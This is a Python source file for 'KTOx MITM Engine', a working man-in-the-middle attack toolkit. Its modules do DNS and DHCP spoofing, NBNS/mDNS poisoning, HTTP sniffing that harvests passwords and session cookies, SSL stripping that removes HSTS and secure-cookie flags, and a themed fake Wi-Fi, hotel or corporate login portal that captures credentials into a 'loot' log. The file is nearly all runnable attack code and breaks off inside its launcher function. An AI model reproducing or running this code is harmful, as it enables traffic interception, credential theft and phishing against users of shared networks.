#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# ktox_mitm.py — KTOx MITM Engine v1.0
# Full MITM suite: DNS spoof, DHCP spoof, HTTP sniff,
# credential harvest, SSL strip, captive portal, IP forwarding

"""
KTOx MITM Engine
Requires: scapy, flask (pip3 install flask)
Must be run as root.

Auto-manages:
  - IP forwarding  (/proc/sys/net/ipv4/ip_forward)
  - iptables rules (saved/restored on exit)
"""

import os, sys, re, time, json, threading, socket, logging, subprocess
from datetime import datetime
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from rich.console import Console
    from rich.panel   import Panel
    from rich.table   import Table
    from rich.rule    import Rule
    from rich.prompt  import Prompt, Confirm
    from rich         import box
except ImportError:
    print("ERROR: pip3 install rich"); sys.exit(1)

try:
    from scapy.all import *
    from scapy.layers.dns   import DNS, DNSQR, DNSRR
    from scapy.layers.dhcp  import DHCP, BOOTP
    from scapy.layers.http  import HTTPRequest, HTTPResponse
    from scapy.config import conf as sconf
    sconf.ipv6_enabled = False
except ImportError as e:
    print(f"ERROR: scapy missing — {e}"); sys.exit(1)

try:
    from flask import Flask, request, redirect, render_template_string
except ImportError:
    print("ERROR: pip3 install flask"); sys.exit(1)

# ── Palette ───────────────────────────────────────────────────────────────────
C_BLOOD  = "#C0392B"
C_RUST   = "#922B21"
C_EMBER  = "#E74C3C"
C_STEEL  = "#717D7E"
C_ASH    = "#ABB2B9"
C_WHITE  = "#F2F3F4"
C_DIM    = "#566573"
C_ORANGE = "#CA6F1E"
C_YELLOW = "#D4AC0D"
C_GOOD   = "#1E8449"

console = Console(highlight=False)

# ── Global state ──────────────────────────────────────────────────────────────
stop_flag        = threading.Event()
loot_dir         = "ktox_loot"
session_log      = None
captured_creds   = []
captured_cookies = []
captured_dns     = []
dhcp_leases      = {}

# ── Loot logger ───────────────────────────────────────────────────────────────
def _init_loot():
    global session_log
    os.makedirs(loot_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_log = os.path.join(loot_dir, f"mitm_{ts}.log")

def loot(event, **kw):
    if not session_log: return
    entry = {"ts": datetime.now().isoformat(), "event": event, "data": kw}
    try:
        with open(session_log, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except: pass

def loot_creds(proto, host, username, password, src_ip):
    captured_creds.append({
        "ts": datetime.now().isoformat(),
        "proto": proto, "host": host,
        "user": username, "pass": password,
        "src": src_ip
    })
    loot("CREDENTIAL", proto=proto, host=host,
         username=username, password=password, src=src_ip)
    console.print(
        f"\n  [{C_EMBER}]⚡ CRED CAPTURED[/{C_EMBER}]  "
        f"[{C_WHITE}]{proto}[/{C_WHITE}]  "
        f"[{C_STEEL}]{host}[/{C_STEEL}]  "
        f"[{C_GOOD}]{username}[/{C_GOOD}] : "
        f"[{C_EMBER}]{password}[/{C_EMBER}]  "
        f"[{C_DIM}]from {src_ip}[/{C_DIM}]"
    )

def tag(t, c=C_BLOOD): return f"[{c}]{t}[/{c}]"
def section(t):
    console.print()
    console.print(Rule(f"[bold {C_BLOOD}] {t} [/bold {C_BLOOD}]", style=C_RUST))
    console.print()

# ── System: IP forwarding + iptables ─────────────────────────────────────────
_ipt_rules_added = []
_orig_ip_forward  = "0"

def enable_ip_forwarding():
    global _orig_ip_forward
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            _orig_ip_forward = f.read().strip()
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
        console.print(f"  [{C_GOOD}]✔ IP forwarding enabled[/{C_GOOD}]")
    except Exception as e:
        console.print(f"  [{C_ORANGE}]⚠  IP forwarding: {e}[/{C_ORANGE}]")

def disable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(_orig_ip_forward + "\n")
        console.print(f"  [{C_STEEL}]IP forwarding restored → {_orig_ip_forward}[/{C_STEEL}]")
    except: pass

def _ipt(args, track=True):
    cmd = ["iptables"] + args
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        if track:
            _ipt_rules_added.append(args)
    except subprocess.CalledProcessError as e:
        console.print(f"  [{C_ORANGE}]⚠  iptables: {' '.join(args)} — {e}[/{C_ORANGE}]")

def setup_iptables_forwarding(iface):
    """Enable NAT forwarding through our interface."""
    _ipt(["-t","nat","-A","POSTROUTING","-o", iface,"-j","MASQUERADE"])
    _ipt(["-A","FORWARD","-i", iface,"-j","ACCEPT"])
    _ipt(["-A","FORWARD","-o", iface,"-j","ACCEPT"])
    console.print(f"  [{C_GOOD}]✔ iptables NAT forwarding enabled[/{C_GOOD}]")

def setup_iptables_http_intercept(port=8080):
    """Redirect HTTP to our sniffer port."""
    _ipt(["-t","nat","-A","PREROUTING","-p","tcp","--dport","80",
          "-j","REDIRECT","--to-port", str(port)])
    console.print(f"  [{C_GOOD}]✔ HTTP traffic redirected → port {port}[/{C_GOOD}]")

def setup_iptables_https_strip(port=8443):
    """Redirect HTTPS to our SSL strip port."""
    _ipt(["-t","nat","-A","PREROUTING","-p","tcp","--dport","443",
          "-j","REDIRECT","--to-port", str(port)])
    console.print(f"  [{C_GOOD}]✔ HTTPS traffic redirected → port {port}[/{C_GOOD}]")

def setup_iptables_dns_intercept():
    """Redirect DNS queries to our DNS server."""
    _ipt(["-t","nat","-A","PREROUTING","-p","udp","--dport","53",
          "-j","REDIRECT","--to-port","5353"])
    _ipt(["-t","nat","-A","PREROUTING","-p","tcp","--dport","53",
          "-j","REDIRECT","--to-port","5353"])
    console.print(f"  [{C_GOOD}]✔ DNS traffic redirected → port 5353[/{C_GOOD}]")

def setup_iptables_captive(portal_port=80):
    """Redirect all HTTP to captive portal."""
    _ipt(["-t","nat","-A","PREROUTING","-p","tcp","--dport","80",
          "-j","REDIRECT","--to-port", str(portal_port)])
    _ipt(["-t","nat","-A","PREROUTING","-p","tcp","--dport","443",
          "-j","REDIRECT","--to-port", str(portal_port)])
    console.print(f"  [{C_GOOD}]✔ All web traffic → captive portal port {portal_port}[/{C_GOOD}]")

def flush_iptables():
    """Remove all rules we added."""
    for args in reversed(_ipt_rules_added):
        # Replace -A with -D to delete
        del_args = []
        for a in args:
            del_args.append("-D" if a == "-A" else a)
        try:
            subprocess.run(["iptables"] + del_args,
                           check=True, capture_output=True)
        except: pass
    _ipt_rules_added.clear()
    console.print(f"  [{C_STEEL}]iptables rules flushed.[/{C_STEEL}]")

def full_cleanup():
    section("MITM CLEANUP")
    flush_iptables()
    disable_ip_forwarding()
    _print_loot_summary()

def _print_loot_summary():
    console.print(Panel(
        f"  {tag('Credentials captured:', C_EMBER)}  [{C_WHITE}]{len(captured_creds)}[/{C_WHITE}]\n"
        f"  {tag('Cookies captured:',     C_STEEL)}  [{C_ASH}]{len(captured_cookies)}[/{C_ASH}]\n"
        f"  {tag('DNS queries logged:',   C_STEEL)}  [{C_ASH}]{len(captured_dns)}[/{C_ASH}]\n"
        f"  {tag('Session log:',          C_DIM)}    [{C_DIM}]{session_log}[/{C_DIM}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ LOOT SUMMARY[/bold {C_BLOOD}]",
        padding=(1,2)
    ))

# ════════════════════════════════════════════════════════════════════════════
# ── MODULE: DNS SPOOFER ──────────────────────────────────────────────────────
# ════════════════════════════════════════════════════════════════════════════

class DNSSpoofer:
    """
    Intercepts DNS queries and returns fake A records.
    Supports per-domain rules and wildcard (* = spoof everything).
    """
    def __init__(self, iface, spoof_ip, rules=None):
        self.iface    = iface
        self.spoof_ip = spoof_ip          # IP to return for spoofed domains
        self.rules    = rules or {"*": spoof_ip}  # domain → IP map
        self._thread  = None

    def _handle(self, pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return  # only questions

        qname = pkt[DNSQR].qname.decode("utf-8").rstrip(".")
        ts    = datetime.now().strftime("%H:%M:%S")

        # Determine spoof target
        target_ip = None
        for domain, ip in self.rules.items():
            if domain == "*" or qname.endswith(domain):
                target_ip = ip
                break

        captured_dns.append({"ts": ts, "query": qname, "spoofed": target_ip})
        loot("DNS_QUERY", query=qname, spoofed=target_ip)

        if target_ip:
            console.print(
                f"  [{C_BLOOD}]DNS SPOOF[/{C_BLOOD}]  "
                f"[{C_WHITE}]{qname}[/{C_WHITE}] → "
                f"[{C_EMBER}]{target_ip}[/{C_EMBER}]  "
                f"[{C_DIM}]{ts}[/{C_DIM}]"
            )
            # Craft fake response
            resp = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=53) /
                DNS(
                    id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname,
                             ttl=60, rdata=target_ip)
                )
            )
            send(resp, verbose=False, iface=self.iface)
        else:
            console.print(
                f"  [{C_DIM}]DNS pass  {qname}  {ts}[/{C_DIM}]"
            )

    def start(self):
        console.print(f"  [{C_GOOD}]✔ DNS Spoofer active on {self.iface}[/{C_GOOD}]")
        console.print(f"  [{C_STEEL}]Rules: {self.rules}[/{C_STEEL}]")

        def _run():
            sniff(
                iface=self.iface,
                filter="udp port 53",
                prn=self._handle,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )
        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()
        return self._thread

    def stop(self):
        stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
# ── MODULE: DHCP SPOOFER ─────────────────────────────────────────────────────
# ════════════════════════════════════════════════════════════════════════════

class DHCPSpoofer:
    """
    Responds to DHCP DISCOVER/REQUEST packets with attacker-controlled config.
    Sets attacker as gateway and DNS server so all traffic routes through us.
    """
    def __init__(self, iface, attacker_ip, subnet_mask="255.255.255.0",
                 lease_range=("192.168.1.100","192.168.1.200"),
                 dns_server=None, router=None):
        self.iface       = iface
        self.attacker_ip = attacker_ip
        self.subnet      = subnet_mask
        self.lease_start = lease_range[0]
        self.lease_end   = lease_range[1]
        self.dns         = dns_server or attacker_ip
        self.router      = router or attacker_ip
        self._lease_idx  = 0
        self._thread     = None

        # Pre-calculate lease pool
        parts = self.lease_start.split(".")
        self._base   = ".".join(parts[:3]) + "."
        self._cur_idx = int(parts[3])
        self._max_idx = int(self.lease_end.split(".")[-1])

    def _next_ip(self, mac):
        if mac in dhcp_leases:
            return dhcp_leases[mac]
        ip = self._base + str(self._cur_idx)
        self._cur_idx += 1
        if self._cur_idx > self._max_idx:
            self._cur_idx = int(self.lease_start.split(".")[-1])
        dhcp_leases[mac] = ip
        return ip

    def _handle(self, pkt):
        if not pkt.haslayer(DHCP): return

        msg_type = None
        for opt in pkt[DHCP].options:
            if opt[0] == "message-type":
                msg_type = opt[1]
                break

        if msg_type not in (1, 3):  # 1=DISCOVER, 3=REQUEST
            return

        client_mac = pkt[Ether].src
        offer_ip   = self._next_ip(client_mac)
        ts         = datetime.now().strftime("%H:%M:%S")

        msg_name = "DISCOVER" if msg_type == 1 else "REQUEST"
        console.print(
            f"  [{C_BLOOD}]DHCP {msg_name}[/{C_BLOOD}]  "
            f"[{C_STEEL}]{client_mac}[/{C_STEEL}] → "
            f"[{C_EMBER}]offering {offer_ip}[/{C_EMBER}]  "
            f"[{C_DIM}]{ts}[/{C_DIM}]"
        )

        resp_type = 2 if msg_type == 1 else 5  # OFFER or ACK

        resp = (
            Ether(src=get_if_hwaddr(self.iface), dst="ff:ff:ff:ff:ff:ff") /
            IP(src=self.attacker_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,
                yiaddr=offer_ip,
                siaddr=self.attacker_ip,
                chaddr=pkt[BOOTP].chaddr,
                xid=pkt[BOOTP].xid
            ) /
            DHCP(options=[
                ("message-type",  resp_type),
                ("server_id",     self.attacker_ip),
                ("lease_time",    86400),
                ("subnet_mask",   self.subnet),
                ("router",        self.router),
                ("name_server",   self.dns),
                ("broadcast_address",
                 self._base + "255"),
                "end"
            ])
        )

        sendp(resp, iface=self.iface, verbose=False)
        loot("DHCP_LEASE", client_mac=client_mac, offered_ip=offer_ip,
             gateway=self.router, dns=self.dns)

    def start(self):
        console.print(f"  [{C_GOOD}]✔ DHCP Spoofer active on {self.iface}[/{C_GOOD}]")
        console.print(
            f"  [{C_STEEL}]Router: {self.router}  "
            f"DNS: {self.dns}  "
            f"Pool: {self.lease_start}–{self.lease_end}[/{C_STEEL}]"
        )

        def _run():
            sniff(
                iface=self.iface,
                filter="udp and (port 67 or port 68)",
                prn=self._handle,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )
        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()
        return self._thread

    def stop(self):
        stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
# ── MODULE: HTTP SNIFFER + CREDENTIAL HARVESTER ──────────────────────────────
# ════════════════════════════════════════════════════════════════════════════

# Regex patterns for credential extraction
CRED_PATTERNS = [
    # Generic login fields
    re.compile(r'(?:username|user|login|email|mail)=([^&\s]+)', re.I),
    re.compile(r'(?:password|passwd|pass|pwd|secret)=([^&\s]+)', re.I),
    # Cookie patterns
    re.compile(r'(?:session|token|auth|jwt|sid)=([^;\s]+)', re.I),
]

USER_PATTERNS = re.compile(
    r'(?:username|user|login|email|mail|name)=([^&\s]+)', re.I
)
PASS_PATTERNS = re.compile(
    r'(?:password|passwd|pass|pwd|secret|key)=([^&\s]+)', re.I
)

class HTTPSniffer:
    """
    Sniffs HTTP traffic on the wire.
    Extracts credentials from POST bodies and cookies from headers.
    """
    def __init__(self, iface):
        self.iface   = iface
        self._thread = None

    def _extract_creds(self, body, host, src_ip):
        if not body: return
        body_str = body.decode("utf-8", errors="ignore")

        users = USER_PATTERNS.findall(body_str)
        passs = PASS_PATTERNS.findall(body_str)

        if users or passs:
            username = users[0] if users else "?"
            password = passs[0] if passs else "?"
            loot_creds("HTTP", host, username, password, src_ip)

    def _extract_cookies(self, headers, host, src_ip):
        cookie_header = headers.get("Cookie", b"").decode("utf-8", errors="ignore")
        if not cookie_header: return

        for pat in CRED_PATTERNS:
            matches = pat.findall(cookie_header)
            for match in matches:
                captured_cookies.append({
                    "ts": datetime.now().isoformat(),
                    "host": host, "cookie": match, "src": src_ip
                })
                console.print(
                    f"  [{C_YELLOW}]🍪 COOKIE[/{C_YELLOW}]  "
                    f"[{C_STEEL}]{host}[/{C_STEEL}]  "
                    f"[{C_ASH}]{match[:60]}[/{C_ASH}]  "
                    f"[{C_DIM}]{src_ip}[/{C_DIM}]"
                )
                loot("COOKIE", host=host, value=match, src=src_ip)

    def _handle(self, pkt):
        if not pkt.haslayer(IP): return

        src_ip = pkt[IP].src
        ts     = datetime.now().strftime("%H:%M:%S")

        # Raw TCP payload sniffing for HTTP
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            raw = pkt[Raw].load
            try:
                text = raw.decode("utf-8", errors="ignore")
            except:
                return

            # Detect HTTP requests
            if text.startswith(("GET ","POST ","PUT ","DELETE ","HEAD ")):
                lines   = text.split("\r\n")
                req_line = lines[0]
                headers  = {}
                body     = b""

                for line in lines[1:]:
                    if ": " in line:
                        k, v = line.split(": ", 1)
                        headers[k] = v.encode()
                    elif line == "":
                        body_start = text.find("\r\n\r\n")
                        if body_start >= 0:
                            body = raw[body_start+4:]
                        break

                host = headers.get("Host", b"unknown").decode("utf-8", errors="ignore") \
                       if isinstance(headers.get("Host", b""), bytes) \
                       else headers.get("Host", "unknown")

                method = req_line.split()[0]
                path   = req_line.split()[1] if len(req_line.split()) > 1 else "/"

                console.print(
                    f"  [{C_STEEL}]HTTP[/{C_STEEL}]  "
                    f"[{C_BLOOD}]{method}[/{C_BLOOD}]  "
                    f"[{C_WHITE}]{host}{path[:50]}[/{C_WHITE}]  "
                    f"[{C_DIM}]{src_ip}  {ts}[/{C_DIM}]"
                )

                loot("HTTP_REQUEST", method=method, host=host,
                     path=path[:200], src=src_ip)

                # POST body credential extraction
                if method == "POST" and body:
                    self._extract_creds(body, host, src_ip)

                # Cookie extraction
                self._extract_cookies(headers, host, src_ip)

    def start(self):
        console.print(f"  [{C_GOOD}]✔ HTTP Sniffer active on {self.iface}[/{C_GOOD}]")

        def _run():
            sniff(
                iface=self.iface,
                filter="tcp port 80",
                prn=self._handle,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )
        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()
        return self._thread

    def stop(self):
        stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
# ── MODULE: SSL STRIPPER ─────────────────────────────────────────────════════
# ════════════════════════════════════════════════════════════════════════════

class SSLStripper:
    """
    Strips HTTPS from HTTP responses by:
    1. Replacing https:// links with http://
    2. Removing HSTS headers
    3. Removing Secure flag from cookies
    Requires iptables to redirect port 80 traffic through us.
    """
    def __init__(self, iface, listen_port=8080):
        self.iface       = iface
        self.listen_port = listen_port
        self._thread     = None
        self._srv        = None

    def _strip_response(self, data):
        """Strip HTTPS from HTTP response."""
        try:
            text = data.decode("utf-8", errors="replace")
        except:
            return data

        # Remove HSTS header
        text = re.sub(r'Strict-Transport-Security:[^\r\n]*\r\n', '', text, flags=re.I)

        # Strip https:// → http://
        original = text
        text = text.replace("https://", "http://")
        text = re.sub(r'href="https:', 'href="http:', text, flags=re.I)
        text = re.sub(r"href='https:", "href='http:", text, flags=re.I)

        # Remove Secure cookie flag
        text = re.sub(r';\s*Secure', '', text, flags=re.I)
        text = re.sub(r';\s*HttpOnly', '', text, flags=re.I)

        if text != original:
            stripped = original.count("https://") - text.count("https://")
            console.print(
                f"  [{C_BLOOD}]SSL STRIP[/{C_BLOOD}]  "
                f"[{C_ASH}]{stripped} HTTPS link(s) stripped[/{C_ASH}]"
            )
            loot("SSL_STRIP", https_stripped=stripped)

        return text.encode("utf-8", errors="replace")

    def _handle_client(self, client_sock, client_addr):
        """Proxy HTTP request, strip SSL from response."""
        try:
            data = client_sock.recv(65535)
            if not data:
                client_sock.close(); return

            # Parse host from request
            text = data.decode("utf-8", errors="ignore")
            host_match = re.search(r'^Host:\s*(.+)$', text, re.M | re.I)
            host = host_match.group(1).strip() if host_match else None

            if not host:
                client_sock.close(); return

            # Connect to actual server on port 80
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.settimeout(5)
            try:
                srv.connect((host, 80))
            except:
                client_sock.close(); return

            srv.sendall(data)

            response = b""
            while True:
                try:
                    chunk = srv.recv(65535)
                    if not chunk: break
                    response += chunk
                except: break

            srv.close()

            # Strip SSL from response
            stripped = self._strip_response(response)
            client_sock.sendall(stripped)

        except Exception as e:
            pass
        finally:
            try: client_sock.close()
            except: pass

    def start(self):
        console.print(
            f"  [{C_GOOD}]✔ SSL Stripper listening on port {self.listen_port}[/{C_GOOD}]"
        )

        def _serve():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", self.listen_port))
            srv.listen(50)
            srv.settimeout(1)
            self._srv = srv

            while not stop_flag.is_set():
                try:
                    client_sock, addr = srv.accept()
                    t = threading.Thread(
                        target=self._handle_client,
                        args=(client_sock, addr),
                        daemon=True
                    )
                    t.start()
                except socket.timeout:
                    continue
                except: break

            srv.close()

        self._thread = threading.Thread(target=_serve, daemon=True)
        self._thread.start()
        return self._thread

    def stop(self):
        stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
# ── MODULE: CAPTIVE PORTAL ────────────────────────────────════════════════
# ════════════════════════════════════════════════════════════════════════════

PORTAL_HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ title }}</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: {{ bg_color }};
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh;
  }
  .card {
    background: white;
    border-radius: 12px;
    padding: 2.5rem;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.2);
    text-align: center;
  }
  .logo { font-size: 2.5rem; margin-bottom: 0.5rem; }
  h1 { font-size: 1.3rem; color: #1a1a1a; margin-bottom: 0.5rem; }
  p { color: #666; font-size: 0.9rem; margin-bottom: 1.5rem; }
  input {
    width: 100%; padding: 0.75rem 1rem;
    border: 1.5px solid #ddd; border-radius: 8px;
    font-size: 1rem; margin-bottom: 0.75rem;
    outline: none; transition: border 0.2s;
  }
  input:focus { border-color: {{ accent }}; }
  button {
    width: 100%; padding: 0.8rem;
    background: {{ accent }}; color: white;
    border: none; border-radius: 8px;
    font-size: 1rem; font-weight: 600;
    cursor: pointer; transition: opacity 0.2s;
  }
  button:hover { opacity: 0.9; }
  .footer { margin-top: 1.5rem; color: #aaa; font-size: 0.75rem; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">{{ logo }}</div>
  <h1>{{ title }}</h1>
  <p>{{ subtitle }}</p>
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="{{ user_placeholder }}" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">{{ button_text }}</button>
  </form>
  <div class="footer">{{ footer }}</div>
</div>
</body>
</html>"""

PORTAL_SUCCESS = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="3;url=http://{{ redirect }}">
<title>Connecting...</title>
<style>
  body { font-family: sans-serif; display:flex; align-items:center;
         justify-content:center; height:100vh; background:#f5f5f5; }
  .msg { text-align:center; }
  .spinner { font-size:2rem; animation: spin 1s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body><div class="msg">
  <div class="spinner">⟳</div>
  <p style="margin-top:1rem;color:#555">Connecting to network...</p>
</div></body>
</html>"""

# Portal themes
PORTAL_THEMES = {
    "wifi":     {"title":"WiFi Login",        "logo":"📶","subtitle":"Sign in to continue",                  "bg":"#1a73e8","accent":"#1a73e8","user_placeholder":"Email or username","button_text":"Sign In",   "footer":"Secured Network Access"},
    "hotel":    {"title":"Hotel WiFi",         "logo":"🏨","subtitle":"Enter your room number and last name", "bg":"#8B6914","accent":"#C9A208","user_placeholder":"Room number",      "button_text":"Connect",   "footer":"Complimentary Guest Internet"},
    "coffee":   {"title":"Free WiFi",          "logo":"☕","subtitle":"Join our loyalty program to connect",  "bg":"#3e2723","accent":"#6d4c41","user_placeholder":"Email address",    "button_text":"Get Online", "footer":""},
    "corp":     {"title":"Corporate Network",  "logo":"🏢","subtitle":"Use your company credentials",         "bg":"#37474f","accent":"#455a64","user_placeholder":"Username / Email",  "button_text":"Log In",    "footer":"IT Security Policy applies"},
    "isp":      {"title":"Account Verification","logo":"🌐","subtitle":"Verify your account to restore access","bg":"#01579b","accent":"#0277bd","user_placeholder":"Username",         "button_text":"Verify",    "footer":"Your ISP"},
}

class CaptivePortal:
    """
    Serves a fake login page that harvests credentials.
    Supports multiple themes (WiFi, hotel, corporate, etc.)
    """
    def __init__(self, attacker_ip, port=80, theme="wifi",
                 custom_title=None, redirect_url="google.com"):
        self.attacker_ip  = attacker_ip
        self.port         = port
        self.theme        = PORTAL_THEMES.get(theme, PORTAL_THEMES["wifi"])
        self.redirect_url = redirect_url
        self._thread      = None

        if custom_title:
            self.theme["title"] = custom_title

        self._app = Flask(__name__)
        self._app.logger.disabled = True
        log = logging.getLogger("werkzeug")
        log.setLevel(logging.ERROR)

        @self._app.route("/", defaults={"path": ""})
        @self._app.route("/<path:path>")
        def portal(path):
            return render_template_string(
                PORTAL_HTML,
                **self.theme,
                bg_color=self.theme["bg"]
            )

        @self._app.route("/login", methods=["POST"])
        def capture():
            username = request.form.get("username", "")
            password = request.form.get("password", "")
            src_ip   = request.remote_addr

            loot_creds("CAPTIVE_PORTAL", self.theme["title"],
                       username, password, src_ip)

            return render_template_string(
                PORTAL_SUCCESS,
                redirect=self.redirect_url
            )

    def start(self):
        theme = self.theme["title"]
        console.print(
            f"  [{C_GOOD}]✔ Captive Portal '{theme}' on port {self.port}[/{C_GOOD}]"
        )
        console.print(
            f"  [{C_STEEL}]URL: http://{self.attacker_ip}:{self.port}[/{C_STEEL}]"
        )

        def _run():
            self._app.run(
                host="0.0.0.0",
                port=self.port,
                debug=False,
                use_reloader=False,
                threaded=True
            )
        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()
        return self._thread

    def stop(self):
        stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
# ── MODULE: NBNS / MDNS POISONER ─────────────────────────────────────────────
# ════════════════════════════════════════════════════════════════════════════

class NBNSPoisoner:
    """
    Poisons NetBIOS Name Service (NBNS) and mDNS queries.
    Responds to Windows name resolution broadcasts with attacker IP.
    Catches SMB/NTLMv2 hashes when combined with Responder-style capture.
    """
    def __init__(self, iface, attacker_ip):
        self.iface       = iface
        self.attacker_ip = attacker_ip
        self._thread     = None

    def _handle_nbns(self, pkt):
        if not pkt.haslayer(UDP): return
        if pkt[UDP].dport != 137: return
        if not pkt.haslayer(Raw): return

        try:
            raw   = pkt[Raw].load
            name  = raw[13:13+15].decode("utf-8", errors="ignore").strip()
            src   = pkt[IP].src
            ts    = datetime.now().strftime("%H:%M:%S")

            console.print(
                f"  [{C_BLOOD}]NBNS[/{C_BLOOD}]  "
                f"[{C_WHITE}]{name}[/{C_WHITE}] "
                f"← [{C_STEEL}]{src}[/{C_STEEL}]  "
                f"[{C_DIM}]{ts}[/{C_DIM}]"
            )
            loot("NBNS_QUERY", name=name, src=src)

            # Build response
            xid = raw[:2]
            resp = (
                IP(src=self.attacker_ip, dst=src) /
                UDP(sport=137, dport=pkt[UDP].sport) /
                Raw(load=(
                    xid +
                    b"\x85\x00\x00\x00\x00\x01\x00\x00\x00\x00" +
                    raw[12:] +
                    b"\x00\x20\x00\x01\x00\x00\xa8\xc0\x00\x06\x00\x00" +
                    socket.inet_aton(self.attacker_ip)
                ))
            )
            send(resp, verbose=False, iface=self.iface)

        except Exception:
            pass

    def _handle_mdns(self, pkt):
        if not pkt.haslayer(UDP): return
        if pkt[UDP].dport != 5353: return
        if not pkt.haslayer(DNS): return
        if pkt[DNS].qr != 0: return  # only queries

        try:
            qname = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
            src   = pkt[IP].src
            ts    = datetime.now().strftime("%H:%M:%S")

            console.print(
                f"  [{C_BLOOD}]mDNS[/{C_BLOOD}]  "
                f"[{C_WHITE}]{qname}[/{C_WHITE}] "
                f"← [{C_STEEL}]{src}[/{C_STEEL}]  "
                f"[{C_DIM}]{ts}[/{C_DIM}]"
            )
            loot("MDNS_QUERY", name=qname, src=src)

            resp = (
                IP(dst=src, src=self.attacker_ip) /
                UDP(sport=5353, dport=5353) /
                DNS(
                    id=0, qr=1, aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=pkt[DNSQR].qname,
                        ttl=120,
                        rdata=self.attacker_ip
                    )
                )
            )
            send(resp, verbose=False, iface=self.iface)

        except Exception:
            pass

    def start(self):
        console.print(
            f"  [{C_GOOD}]✔ NBNS/mDNS Poisoner active on {self.iface}[/{C_GOOD}]"
        )

        def _run_nbns():
            sniff(
                iface=self.iface,
                filter="udp port 137",
                prn=self._handle_nbns,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )

        def _run_mdns():
            sniff(
                iface=self.iface,
                filter="udp port 5353",
                prn=self._handle_mdns,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )

        t1 = threading.Thread(target=_run_nbns, daemon=True)
        t2 = threading.Thread(target=_run_mdns, daemon=True)
        t1.start(); t2.start()
        self._thread = t1
        return t1

    def stop(self):
        stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
# ── FULL MITM SESSION LAUNCHER ───────────────────────────────────────────────
# ════════════════════════════════════════════════════════════════════════════

def launch_full_mitm(iface, attacker_ip, gateway_ip,
                     dns_rules=None, portal_theme="wifi",
                     enable_ssl_strip=True,
                     enable_dns=True,
                     enable_dhcp=True,
                     enable_http_sniff=True,
                     enable_portal=False,
                     enable_nbns=True):
    """
    Full MITM session:
    1. Enable IP forwarding
    2. Set up iptables
    3. Start all selected engines
    """
    section("MITM ENGINE STARTING")
    _init_loot()

    console.print(Panel(
        f"  {tag('Interface:',   C_BLOOD)}  [{C_WHITE}]{iface}[/{C_WHITE}]\n"
        f"  {tag('Attacker IP:', C_BLOOD)}  [{C_WHITE}]{attacker_ip}[/{C_WHITE}]\n"
        f"  {tag('Gateway IP:',  C_STEEL)}  [{C_ASH}]{gateway_ip}[/{C_ASH}]\n"
        f"  {tag('Session log:', C_DIM)}    [{C_DIM}]{session_log}[/{C_DIM}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ KTOX MITM ENGINE[/bold {C_BLOOD}]",
        padding=(1,2)
    ))

    threads = []

    # ── IP forwarding
    enable_ip_forwarding()

    # ── iptables
    setup_iptables_forwarding(iface)
    if enable_dns:
        setup_iptables_dns_intercept()
    if enable_ssl_strip:
        setup_iptables_http_intercept(8080)
        setup_iptables_https_strip(8443)
    if enable_portal:
        setup_iptables_captive(8888)

    console.print()

    # ── DNS Spoofer
    if enable_dns:
        rules = dns_rules or {"*": attacker_ip}
        dns   = DNSSpoofer(iface, attacker_ip, rules)
        threads.append(dns.start())

    # ── DHCP Spoofer
    if enable_dhcp:
        dhcp = DHCPSpoofer(iface, attacker_ip,
                           dns_server=attacker_ip,
                           router=attacker_ip)
        threads.append(dhcp.start())

    # ── HTTP Sniffer
    if enable_http_sniff:
        http = HTTPSniffer(iface)
        threads.append(http.start())

    # ── SSL Stripper
    if enable_ssl_strip:
        ssl = SSLStripper(iface, listen_port=8080)
        threads.append(ssl.start())

